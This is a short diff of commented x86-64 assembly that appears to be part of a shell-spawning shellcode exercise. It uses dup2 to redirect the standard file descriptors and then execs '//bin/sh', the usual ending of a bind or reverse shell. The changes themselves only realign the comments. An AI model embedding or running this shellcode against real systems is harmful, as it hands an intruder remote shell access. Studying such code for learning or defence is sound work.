@@ -49,18 +49,18 @@ _start:
 		xor rsi, rsi					;set to 0 the register used to store the file descriptor
 		mov al, 0x21					;indicate the number for the dup2 syscall
 		syscall
-		inc sil							;increment by 1 the register used to store the file descriptor
+		inc sil						;increment by 1 the register used to store the file descriptor
 		mov al, 0x21					;indicate the number for the dup2 syscall
 		syscall
-		inc sil							;increment by 1 the register used to store the file descriptor
+		inc sil						;increment by 1 the register used to store the file descriptor
 		mov al, 0x21					;indicate the number for the dup2 syscall
 		syscall
 
 	execShell:
-		mov rdi, 0x68732f6e69622f2f		;"//bin/sh" in little endian
+		mov rdi, 0x68732f6e69622f2f			;"//bin/sh" in little endian
 		xor rsi, rsi					;indicate the arguments (here there are no arguments)
-		push rsi						;put on the stack null byte
-		push rdi						;put on the stack "//bin/sh"
+		push rsi					;put on the stack null byte
+		push rdi					;put on the stack "//bin/sh"
 		xor rdx, rdx					;indicate the environment (here there is no environment)
 		lea rdi, [rsp]					;indicate the path (here "//bin/sh")
 		xor rax, rax					;set to 0 the register use to store the syscall number
